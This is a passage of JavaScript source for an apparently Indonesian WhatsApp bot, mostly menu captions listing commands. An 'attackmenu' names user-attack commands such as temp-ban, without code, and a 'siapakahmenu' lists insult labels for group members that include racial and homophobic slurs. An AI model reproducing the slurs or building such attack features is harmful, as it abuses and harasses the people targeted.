   ◦ ʟɪᴢᴀʀᴅ
   ◦ sᴘᴀɴᴋ
   ◦ ᴍᴇᴏᴡ
   ◦ ᴛɪᴄᴋʟᴇ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "searchmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ S E A R C H M E N U メ*
┈─────────┈⫺
   ◦ ɢᴏᴏɢʟᴇ
   ◦ ʟɪʀɪᴋ
   ◦ ᴛᴛꜱᴇᴀᴄʀʜ
   ◦ ʀᴇᴀᴅᴍᴏʀᴇ
   ◦ ᴀᴘᴋꜱᴇᴀʀᴄʜ
   ◦ ꜱᴛɪᴄᴋᴇʀꜱᴇᴀʀᴄʜ
   ◦ ᴊᴀʀᴀᴋ
   ◦ ssᴡᴇʙ
   ◦ ssᴡᴇʙᴅᴇsᴋᴛᴏᴘ
   ◦ ssᴡᴇʙᴛᴀʙʟᴇᴛ
   ◦ ssᴡᴇʙᴘʜᴏɴᴇ
   ◦ ꜱᴄ
   ◦ ᴏᴡɴᴇʀ
   ◦ ʀᴜʟᴇꜱ
   ◦ ᴀɪ
   ◦ ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ
   ◦ ɢᴀᴍᴇᴘᴏᴘ
   ◦ ᴋᴜʟɪɴᴇʀ
   ◦ ᴏᴛᴀᴋᴜᴅᴇsᴅᴇᴛᴀɪʟs
   ◦ ᴏᴛᴀᴋᴜᴅᴇssᴇᴀʀᴄʜ
   ◦ sɪᴀᴘᴀᴋᴀʜ
   ◦ ᴋᴄɪᴍɢ
   ◦ ᴍᴏᴅᴀᴘᴋ
   ◦ ǫᴜᴏᴛᴇs
   ◦ ɪsʟᴀᴍɴᴇᴡs
   ◦ quotesanime
   ◦ ǫᴜᴏᴛᴇsʙᴀᴄᴏᴛ
   ◦ ᴄᴜᴀᴄᴀ
   ◦ ғʟɪᴘᴛᴇxᴛ
   ◦ ʏᴛsᴇᴀʀᴄʜ
   ◦ ʏᴛs
   ◦ ʏᴛs2`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "islamimenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ I S L AM M E N U メ*
┈─────────┈⫺
   ◦ kisahnabi
   ◦ quotesislami
   ◦ niatsholat
   ◦ bacaansholat
   ◦ doaharian
   ◦ ayatkursi`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "addmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ A D D M E N U メ*
┈─────────┈⫺
   ◦ ꜱᴇᴛᴄᴍᴅ
   ◦ ᴅᴇʟᴄᴍᴅ
   ◦ ʟɪꜱᴛᴄᴍᴅ
   ◦ ᴀᴅᴅᴘᴅꜰ
   ◦ ᴅᴇʟᴘᴅꜰ
   ◦ ʟɪꜱᴛᴘᴅꜰ
   ◦ ʏᴏᴘᴅꜰ
   ◦ ꜱᴇɴᴅᴘᴅꜰ
   ◦ ᴀᴅᴅᴢɪᴘ
   ◦ ᴅᴇʟᴢɪᴘ
   ◦ ʟɪꜱᴛᴢɪᴘ
   ◦ ʏᴏᴢɪᴘ
   ◦ ꜱᴇɴᴅᴢɪᴘ
   ◦ ᴀᴅᴅᴀᴘᴋ
   ◦ ᴅᴇʟᴀᴘᴋ
   ◦ ʟɪꜱᴛᴀᴘᴋ
   ◦ ʏᴏᴀᴘᴋ
   ◦ ꜱᴇɴᴅᴀᴘᴋ
   ◦ ᴀᴅᴅᴠɴ
   ◦ ᴅᴇʟᴠɴ
   ◦ ʟɪꜱᴛᴠɴ
   ◦ ᴀᴅᴅᴍꜱɢ
   ◦ ꜱᴇɴᴅʟɪꜱᴛ
   ◦ ʟɪꜱᴛᴍꜱɢ
   ◦ ᴅᴇʟᴍꜱɢ
   ◦ ɢᴇᴛᴍꜱɢ`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;

case "ephotomenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ E P H O T O M E N U*
┈─────────┈⫺
   ◦ glitchtext
   ◦ writetext
   ◦ advancedglow
   ◦ typographytext
   ◦ pixelglitch
   ◦ neonglitch
   ◦ flagtext
   ◦ flag3dtext
   ◦ deletingtext
   ◦ blackpinkstyle
   ◦ glowingtext
   ◦ underwatertext
   ◦ logomakerl
   ◦ cartoonstyle
   ◦ papercutstyle
   ◦ watercolortext
   ◦ effectclouds
   ◦ blackpinklogo
   ◦ gradienttext
   ◦ summerbeach
   ◦ mluxurygold
   ◦ multicoloredneon
   ◦ sandsummer
   ◦ galaxywallpaper
   ◦ 1917style
   ◦ lmakingneon
   ◦ royaltext
   ◦ freecreate
   ◦ galaxystyle
   ◦ lighteffects
   ◦ logoneko`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "cerpenmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ C E R P E N M E N U*
┈─────────┈⫺
   ◦ cerpen anak
   ◦ cerpen bahasadaerah
   ◦ cerpen bahasainggris
   ◦ cerpen bahasajawa
   ◦ cerpen bahasasunda
   ◦ cerpen budaya
   ◦ cerpen cinta
   ◦ cerpen cintaislami
   ◦ cerpen cintapertama
   ◦ cerpen cintaromantis
   ◦ cerpen cintasedih
   ◦ cerpen cintasegitiga
   ◦ cerpen cintasejati
   ◦ cerpen galau
   ◦ cerpen gokil
   ◦ cerpen inspirasi
   ◦ cerpen jepang
   ◦ cerpen kehidupan
   ◦ cerpen keluarga
   ◦ cerpen kisahnyata
   ◦ cerpen korea
   ◦ cerpen kristen
   ◦ cerpen liburan
   ◦ cerpen malaysia
   ◦ cerpen mengharukan
   ◦ cerpen misteri
   ◦ cerpen motivasi
   ◦ cerpen nasihat
   ◦ cerpen olahraga
   ◦ cerpen patahhati
   ◦ cerpen penantian
   ◦ cerpen pendidikan
   ◦ cerpen pengalaman
   ◦ cerpen pengorbanan
   ◦ cerpen penyesalan
   ◦ cerpen perjuangan
   ◦ cerpen perpisahan
   ◦ cerpen persahabatan
   ◦ cerpen petualangan
   ◦ cerpen ramadhan
   ◦ cerpen remaja
   ◦ cerpen rindu
   ◦ cerpen rohani
   ◦ cerpen romantis
   ◦ cerpen sastra
   ◦ cerpen sedih
   ◦ cerpen sejarah`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "soundmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ S O U N D M E N U*
┈─────────┈⫺
   ◦  sound1
   ◦  sound2
   ◦  sound3
   ◦  sound4
   ◦  sound5
   ◦  sound6
   ◦  sound7
   ◦  sound8
   ◦  sound9
   ◦  sound10
   ◦  sound11
   ◦  sound12
   ◦  sound13
   ◦  sound14
   ◦  sound15
   ◦  sound16
   ◦  sound17
   ◦  sound18
   ◦  sound18
   ◦  sound20
   ◦  sound21
   ◦  sound22
   ◦  sound23
   ◦  sound24
   ◦  sound25
   ◦  sound26
   ◦  sound27
   ◦  sound28
   ◦  sound29
   ◦  sound30
   ◦  sound31
   ◦  sound32
   ◦  sound33
   ◦  sound34
   ◦  sound35
   ◦  sound36
   ◦  sound37
   ◦  sound38
   ◦  sound39
   ◦  sound40
   ◦  sound41
   ◦  sound42
   ◦  sound43
   ◦  sound44
   ◦  sound45
   ◦  sound46
   ◦  sound47
   ◦  sound48
   ◦  sound49
   ◦  sound50
   ◦  sound51
   ◦  sound52
   ◦  sound53   
   ◦  sound54
   ◦  sound55
   ◦  sound56
   ◦  sound57
   ◦  sound58
   ◦  sound59
   ◦  sound60
   ◦  sound61
   ◦  sound62
   ◦  sound63
   ◦  sound64
   ◦  sound65
   ◦  sound66
   ◦  sound67
   ◦  sound68
   ◦  sound69
   ◦  sound70
   ◦  sound71
   ◦  sound72
   ◦  sound73
   ◦  sound74
   ◦  sound75
   ◦  sound76
   ◦  sound77
   ◦  sound78
   ◦  sound79
   ◦  sound80
   ◦  sound81
   ◦  sound82
   ◦  sound83
   ◦  sound84
   ◦  sound85
   ◦  sound86
   ◦  sound87
   ◦  sound88
   ◦  sound89
   ◦  sound90
   ◦  sound91
   ◦  sound92
   ◦  sound93
   ◦  sound94
   ◦  sound95
   ◦  sound96
   ◦  sound97
   ◦  sound98
   ◦  sound99
   ◦  sound100
   ◦  sound101
   ◦  sound102
   ◦  sound103
   ◦  sound104
   ◦  sound105
   ◦  sound106
   ◦  sound107
   ◦  sound108
   ◦  sound109
   ◦  sound110
   ◦  sound111
   ◦  sound112
   ◦  sound113
   ◦  sound114
   ◦  sound115
   ◦  sound116
   ◦  sound117
   ◦  sound118
   ◦  sound119
   ◦  sound120
   ◦  sound121
   ◦  sound122
   ◦  sound123
   ◦  sound124
   ◦  sound125
   ◦  sound126
   ◦  sound127
   ◦  sound128
   ◦  sound129
   ◦  sound130
   ◦  sound131
   ◦  sound132
   ◦  sound133
   ◦  sound134
   ◦  sound135
   ◦  sound136
   ◦  sound137
   ◦  sound138
   ◦  sound139
   ◦  sound140
   ◦  sound141
   ◦  sound142
   ◦  sound143
   ◦  sound144
   ◦  sound145
   ◦  sound146
   ◦  sound147
   ◦  sound148
   ◦  sound149
   ◦  sound150
   ◦  sound151
   ◦  sound152
   ◦  sound153
   ◦  sound154
   ◦  sound155
   ◦  sound156
   ◦  sound157
   ◦  sound158
   ◦  sound159
   ◦  sound160
   ◦  sound161
   ◦  sad1
   ◦  sad2
   ◦  sad3
   ◦  sad4
   ◦  sad5
   ◦  sad6
   ◦  sad7
   ◦  sad8
   ◦  sad9
   ◦  sad10
   ◦  sad11
   ◦  sad12
   ◦  sad13
   ◦  sad14
   ◦  sad15
   ◦  sad16
   ◦  sad17
   ◦  sad18
   ◦  sad19
   ◦  sad20
   ◦  sad21
   ◦  sad22
   ◦  sad23
   ◦  sad24
   ◦  sad25
   ◦  sad26
   ◦  sad27
   ◦  sad28
   ◦  sad29
   ◦  sad30
   ◦  sad31
   ◦  sad32
   ◦  sad33
   ◦  sad34
   ◦  sad35`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "textmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ T E X T M A K E R M E N U メ*
┈─────────┈⫺
   ◦  blackpink
   ◦  rainbow2
   ◦  water_pipe
   ◦  halloween
   ◦  sketch
   ◦  sircuit
   ◦  discovery
   ◦  metallic2
   ◦  fiction
   ◦  demon
   ◦  transformer
   ◦  berry
   ◦  thunder
   ◦  magma
   ◦  3dstone
   ◦  neon
   ◦  glitch
   ◦  harry_potter
   ◦  embossed
   ◦  broken
   ◦  papercut
   ◦  gradient
   ◦  glossy
   ◦  watercolor
   ◦  multicolor
   ◦  neon_devil
   ◦  underwater
   ◦  bear
   ◦  wonderfulg
   ◦  christmas
   ◦  neon_light
   ◦  snow
   ◦  cloudsky
   ◦  luxury2
   ◦  gradient2
   ◦  summer
   ◦  writing
   ◦  engraved
   ◦  summery
   ◦  3dglue
   ◦  metaldark
   ◦  neonlight
   ◦  oscar
   ◦  minion
   ◦  holographic
   ◦  purple
   ◦  glossyb
   ◦  deluxe2
   ◦  glossyc
   ◦  fabric
   ◦  neonc
   ◦  newyear
   ◦  newyear2
   ◦  metals
   ◦  xmas
   ◦  blood
   ◦  darkg
   ◦  joker
   ◦  wicker
   ◦  natural
   ◦  firework
   ◦  skeleton
   ◦  balloon
   ◦  balloon2
   ◦  balloon3
   ◦  balloon4
   ◦  balloon5
   ◦  balloon6
   ◦  balloon7
   ◦  steel
   ◦  gloss
   ◦  denim
   ◦  decorate
   ◦  decorate2
   ◦  peridot
   ◦  rock
   ◦  glass
   ◦  glass2
   ◦  glass3
   ◦  glass4
   ◦  captain_as2
   ◦  robot
   ◦  equalizer
   ◦  toxic
   ◦  sparkling
   ◦  sparkling2
   ◦  sparkling3
   ◦  decorative
   ◦  chocolate
   ◦  strawberry
   ◦  koifish
   ◦  bread
   ◦  matrix
   ◦  blood2
   ◦  neonligth2
   ◦  thunder2
   ◦  3dbox
   ◦  neon2
   ◦  roadw
   ◦  bokeh
   ◦  gneon
   ◦  advanced
   ◦  dropwater
   ◦  wall
   ◦  chrismast
   ◦  honey
   ◦  drug
   ◦  marble
   ◦  marble2
   ◦  ice
   ◦  juice
   ◦  rusty
   ◦  abstra
   ◦  biscuit
   ◦  wood
   ◦  scifi
   ◦  metalr
   ◦  purpleg
   ◦  shiny
   ◦  jewelry
   ◦  jewelry2
   ◦  metalh
   ◦  golden
   ◦  glitter
   ◦  metale
   ◦  carbon
   ◦  candy
   ◦  metalb
   ◦  gemb
   ◦  3dchrome
   ◦  metalb2
   ◦  metalg`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "randomftmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ R A N D O M F T M E N U メ*
┈─────────┈⫺
   ◦ aesthetic
   ◦ coffee
   ◦ wikimedia
   ◦ wallpaper
   ◦ art
   ◦ bts
   ◦ dogwoof
   ◦ catmeow
   ◦ lizardpic
   ◦ goosebird
   ◦ 8ballpool
   ◦ cosplay
   ◦ hacker
   ◦ cyber
   ◦ gamewallpaperm
   ◦ islamic
   ◦ jennie
   ◦ jiso
   ◦ satanic
   ◦ justina
   ◦ cartoon
   ◦ pentol
   ◦ cat
   ◦ kpop
   ◦ exo
   ◦ lisa
   ◦ space
   ◦ car
   ◦ technology
   ◦ bike
   ◦ shortquote
   ◦ antiwork
   ◦ hacking
   ◦ boneka
   ◦ rose
   ◦ ryujin
   ◦ ulzzangboy
   ◦ ulzzanggirl
   ◦ wall
   ◦ wallphone
   ◦ mountain
   ◦ goose
   ◦ profilepic
   ◦ couplepp
   ◦ programming
   ◦ pubg
   ◦ blackpink
   ◦ randomboy
   ◦ randomgirl
   ◦ hijab
   ◦ chinese
   ◦ indo
   ◦ japanese
   ◦ korean
   ◦ malay
   ◦ thai
   ◦ vietnamese
   ◦ suga
   ◦ wuyifan
   ◦ parkchanyeol
   ◦ ohsehun
   ◦ luhan
   ◦ kimtaehyung
   ◦ kimsoek
   ◦ kimnanjoon
   ◦ kimjunmyeon
   ◦ kimjong
   ◦ kimjondae
   ◦ jungkook
   ◦ jimin
   ◦ jhope
   ◦ huangzitao
   ◦ dohkyungsoo
   ◦ baekhyung`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "siapakahmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ S I A P A K A H M E N U メ*
┈─────────┈⫺
   ◦ tolol
   ◦ gaguna
   ◦ jomok
   ◦ idiot
   ◦ gay
   ◦ lesbi
   ◦ anjink
   ◦ babi
   ◦ kucing
   ◦ beban
   ◦ bebankeluarga
   ◦ gadakeluarga
   ◦ miskin
   ◦ sampah
   ◦ wibu
   ◦ cantik
   ◦ ganteng
   ◦ tampan
   ◦ cute
   ◦ kind
   ◦ Islam
   ◦ kristen
   ◦ hindu
   ◦ katolik
   ◦ gandu
   ◦ madarchod
   ◦ kala
   ◦ gora
   ◦ chutiya
   ◦ nibba
   ◦ nibbi
   ◦ bhosdiwala
   ◦ chutmarika
   ◦ bokachoda
   ◦ suarerbaccha
   ◦ bolochoda
   ◦ muthal
   ◦ muthbaaz
   ◦ randibaaz
   ◦ topibaaz
   ◦ cunt
   ◦ nerd
   ◦ behenchod
   ◦ behnchoda
   ◦ bhosdika
   ◦ nerd
   ◦ mc
   ◦ bsdk
   ◦ bhosdk
   ◦ nigger
   ◦ loda
   ◦ laund
   ◦ nigga
   ◦ noobra
   ◦ tharki
   ◦ nibba
   ◦ nibbi
   ◦ mumu
   ◦ rascal
   ◦ scumbag
   ◦ nuts
   ◦ comrade
   ◦ fagot
   ◦ scoundrel
   ◦ ditch
   ◦ dope
   ◦ gucci
   ◦ lit
   ◦ dumbass
   ◦ sexy
   ◦ crackhead
   ◦ mf
   ◦ motherfucker
   ◦ dogla
   ◦ bewda
   ◦ boka
   ◦ khanki
   ◦ bal 
   ◦ sucker
   ◦ fuckboy
   ◦ playboy
   ◦ fuckgirl
   ◦ playgirl
   ◦ hot`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "attackmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `   
┈─────────┈⫺
*メ A T T A C K M E N U メ*
┈─────────┈⫺
   ◦ ᴛᴇᴍᴘ-ʙᴀɴ
   ◦ ᴋʜᴀᴇʀᴜʟᴢx
   ◦ ɢᴏʏᴀɴɢ
   ◦ ᴍɪx`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
          case 'gamemenu': case 'menugame': {
          if (banned.includes(m.sender)) {
return;
}
          if (!isRegistered) return reply(mess.regis)
          let Menu_Rulz = `
┈─────────┈⫺
*メ G A M E M E N U メ*
┈─────────┈⫺
   ◦ ᴛᴇʙᴀᴋʙᴏᴍ
   ◦ sᴜɪᴛ ᴘᴠᴘ
   ◦ ᴛᴇʙᴀᴋᴋᴀᴛᴀ
   ◦ ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
   ◦ sᴜsᴜɴᴋᴀᴛᴀ
   ◦ ᴛɪᴄᴛᴀᴄᴛᴏᴇ
   ◦ ᴛᴇʙᴀᴋᴊᴋᴛ48
   ◦ ᴛᴇᴋᴀᴛᴇᴋɪ
   ◦ sɪᴀᴘᴀᴋᴀʜᴀᴋᴜ
   ◦ ᴛᴇʙᴀᴋʟɪʀɪᴋ
   ◦ ᴛᴇʙᴀᴋᴜᴍᴜʀ
   ◦ ʏᴇsɴᴏ
   ◦ ᴘᴇᴛᴀᴋʙᴏᴍ
   ◦ sᴜɪᴛʙᴏᴛ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'jkt48menu': case 'menujkt48': {
 if (banned.includes(m.sender)) {
return;
}
          if (!isRegistered) return reply(mess.regis)
          let Menu_Rulz = `
┈─────────┈⫺
*メ J K T 4 8 M E N U メ*
┈─────────┈⫺
   ◦ ᴄʜʀɪsᴛʏ-ᴊᴋᴛ48
   ◦ ᴀᴅᴇʟ-ᴊᴋᴛ48
   ◦ ɪɴᴅɪʀᴀ-ᴊᴋᴛ48
   ◦ ғʀᴇʏᴀ-ᴊᴋᴛ48
   ◦ ᴍɪᴄʜɪᴇ-ᴊᴋᴛ48
   ◦ ᴊɪᴋᴏ-ᴏsʜɪ
   ◦ ᴛᴇʙᴀᴋᴊᴋᴛ48`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
/**
 * 
 * [ *SDXL WAIFU* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

//scrape buatan `https://whatsapp.com/channel/0029VagFeoY9cDDa9ulpwM0T`

case 'sdxlwaifu': {
if (banned.includes(m.sender)) {
return;
}
  if (!text) return reply(`Example: ${prefix + command} yourrtext`)
async function sdxlWaifu(prompt) {
  try {
    return await new Promise(async(resolve, reject) => {
      if(!prompt) return reject("failed reading undefined prompt!");
      axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
        prompt,
        negativePrompt: "nsfw, nude, uncensored, cleavage, nipples",
        key: "Waifu",
        width: 512,
        height: 768,
        quantity: 1,
        size: "512x768"
      }).then(res => {
        const data = res.data;
        if(data.code !== 0) return reject(data.message);
        if(data.data.safetyState === "RISKY") return reject("nsfw image was generated, you try create other image again!")
        if(!data.data?.url) return reject("failed generating image!")
        return resolve({
          status: true,
          image: data.data.url
        })
      }).catch(reject)
    })
  } catch (e) {
    return {
      status: false,
      message: e
    }
  }
}
try {
  let plerl = await sdxlWaifu(text)
  KhaerulZx.sendMessage(from, { image: { url: plerl.image }, caption: `nah itu bang` }, { quoted: m })
} catch (error) {
  m.reply("Error bang")
}
}
break;
case 'beritamenu': {
if (banned.includes(m.sender)) {
return;
}
if (!isRegistered) return reply('Kamu belum daftar, silahkan ketik .daftar')
           let Menu_Rulz = `
┈─────────┈⫺
*メ B E R I T A M E N U メ*
┈─────────┈⫺
   ◦ ꜰᴀᴊᴀʀ
   ◦ ᴄɴɴ
   ◦ ʟᴀʏᴀʀᴋᴀᴄᴀ
   ◦ ᴄɴʙᴄ
   ◦ ᴛʀɪʙᴜɴ
   ◦ ɪɴᴅᴏᴢᴏɴᴇ
   ◦ ᴋᴏᴍᴘᴀꜱ
   ◦ ᴅᴇᴛɪᴋ
   ◦ ᴅᴀɪʟʏ
   ◦ ɪɴᴇᴡꜱ
   ◦ ᴏᴋᴇᴢᴏɴᴇ
   ◦ ꜱɪɴᴅᴏ
   ◦ ᴛᴇᴍᴘᴏ
   ◦ ᴀɴᴛᴀʀᴀ
   ◦ ᴋᴏɴᴛᴀɴ
   ◦ ᴍᴇʀᴅᴇᴋᴀ
   ◦ ᴊᴀʟᴀɴᴛɪᴋᴜꜱ-ᴍᴇᴍᴇ
   ◦ ɢᴇᴍᴘᴀ
   ◦ ɢᴇᴍᴘᴀ
   ◦ ᴀꜰᴋ`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'depomenu': {
if (banned.includes(m.sender)) {
return;
}
if (!isRegistered) return reply('Kamu belum daftar, silahkan ketik .daftar')
           let Menu_Rulz = `
┈─────────┈⫺
*メ D E P O S I T M E N U メ*
┈─────────┈⫺
   ◦ ᴅᴀɴᴀ
   ◦ ʙᴜʏꜱᴄ
   ◦ 1gbsaldo
   ◦ 2gbsaldo
   ◦ 3gbsaldo
   ◦ 4gbsaldo
   ◦ 5gbsaldo
   ◦ 6gbsaldo
   ◦ 7gbsaldo
   ◦ 8gbsaldo
   ◦ unlisaldo
   ◦ ᴀᴅᴅꜱᴀʟᴅᴏ
   ◦ ᴍɪɴꜱᴀʟᴅᴏ
   ◦ buysrv
   ◦ buyschanakov5
   ◦ ꜱᴀʟᴅᴏ
   ◦ pembayaran
   ◦ dana
   ◦ qria
   ◦ depo
   ◦ saldo
   ◦ trxgagal`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'convert-menu': {
if (banned.includes(m.sender)) {
return;
}
if (!isRegistered) return reply('Kamu belum daftar, silahkan ketik .daftar')
           let Menu_Rulz = `
┈─────────┈⫺
*メ C O N V E R T M E N U メ*
┈─────────┈⫺
   ◦ ᴛᴏᴜʀʟ
   ◦ ꜱᴛɪᴄᴋᴇʀ
   ◦ ꜱᴍᴇᴍᴇ
   ◦ ʜᴅʀ
   ◦ ɢᴇᴛᴘɪᴄ
   ◦ ɢᴇᴛɴᴀᴍᴇ
   ◦ ǫᴄ
   ◦ ǫᴄ2
   ◦ ᴛᴏᴀᴜᴅɪᴏ
   ◦ ᴏʙꜰᴜꜱ
   ◦ ꜱꜱᴡᴇʙ
   ◦ ᴛᴏɪᴍɢ
   ◦ ᴛᴏᴢᴏᴍʙɪᴇ
   ◦ ʀᴇᴍᴏᴠᴇʙɢ
   ◦ ǫᴄɪᴍᴀɢᴇ`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'aimenu': {
if (banned.includes(m.sender)) {
return;
}
if (!isRegistered) return reply('Kamu belum daftar, silahkan ketik .daftar')
           let Menu_Rulz = `
┈─────────┈⫺
*メ A I M E N U*
┈─────────┈⫺
   ◦ ᴀɪ
   ◦ ᴏᴘᴇɴᴀɪ
   ◦ ꜱɪᴍɪ
   ◦ ꜱɪᴍɪꜱɪᴍɪ
   ◦ ᴛᴏᴢᴏᴍʙɪᴇ
   ◦ ᴀᴍʙᴀᴛᴜᴋᴀᴍ
   ◦ ꜰɪɴꜱɪɪ
   ◦ ꜰɪɴꜱɪɪ-ᴀɪ
   ◦ ʀᴇᴍɪɴɪ
   ◦ ʜᴅ2`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'antimenu': {
if (banned.includes(m.sender)) {
return;
}
if (!isRegistered) return reply('Kamu belum daftar, silahkan ketik .daftar')
           let Menu_Rulz = `
┈─────────┈⫺
*メ A N T I M E N U メ*
┈─────────┈⫺
   ◦ ᴀɴᴛɪʙᴏᴛ
   ◦ ᴀɴᴛɪᴡᴀᴍᴇ
   ◦ ᴀɴᴛɪᴀꜱɪɴɢ
   ◦ ᴀɴᴛɪᴠɪʀᴛᴇx
   ◦ ᴀɴᴛɪʟɪɴᴋᴀʟʟ
   ◦ ᴀɴᴛɪʟɪɴᴋꜰʙ
   ◦ ᴀɴᴛɪʟɪɴᴋʏᴛ
   ◦ ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ
   ◦ ᴀɴᴛɪʟɪɴᴋɪɢ
   ◦ ᴀɴᴛɪʟɪɴᴋᴛᴇʟᴇ
   ◦ ᴀɴᴛɪʟɪɴᴋᴛɪᴋᴛᴏᴋ
   ◦ ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛᴛᴇʀ
   ◦ ᴀɴᴛɪʟɪɴᴋ
   ◦ ᴀɴᴛɪᴍᴇᴅɪᴀ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'getpp': case 'getprofile': case 'colong-pp': {
if (banned.includes(m.sender)) {
return;
}
if (!m.isGroup) return reply ("Fitur Khusus Group\n\nsilahkan ketik .gcbot untuk melihat group bot")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await KhaerulZx.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
KhaerulZx.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break
case 'funmenu': {
if (banned.includes(m.sender)) {
return;
}
if (!isRegistered) return reply('Kamu belum daftar, silahkan ketik .daftar')
           let Menu_Rulz = `
┈─────────┈⫺
*メ F U N M E N U メ*
┈─────────┈⫺
   ◦ ᴄᴀɴᴛɪᴋᴄᴇᴋ
   ◦ ᴡᴀɴɢʏ
   ◦ ꜱᴀɴɢᴇᴄᴇᴋ
   ◦ ᴋᴀᴘᴀɴᴋᴀʜ
   ◦ ʀᴀᴛᴇ
   ◦ ᴊᴏᴍᴏᴋᴄᴇᴋ
   ◦ ɢᴀɴᴛᴇɴɢᴄᴇᴋ
   ◦ ᴄᴇᴋᴀꜱᴀʟᴍᴇᴍʙᴇʀ
   ◦ ǫᴄ
   ◦ ǫᴄ2
   ◦ ᴛᴛꜱ
   ◦ ᴛɪᴋᴛᴏᴋꜱᴛᴀʟᴋ
   ◦ ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
   ◦ ʀᴠᴏ
   ◦ ᴜᴘꜱᴡ
   ◦ ɢᴇᴛꜱᴡ
   ◦ ʟɪꜱᴛꜱᴡ
   ◦ ᴛᴏᴛᴀʟꜰɪᴛᴜʀᴇ
   ◦ ꜰᴇɴɢꜱʜᴜɪ
   ◦ ᴀʀᴛɪᴛᴀʀᴏᴛ
   ◦ ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ
   ◦ ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ
   ◦ ᴘᴇᴋᴇʀᴊᴀᴀɴ
   ◦ ʀᴇᴊᴇᴋɪ
   ◦ ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ
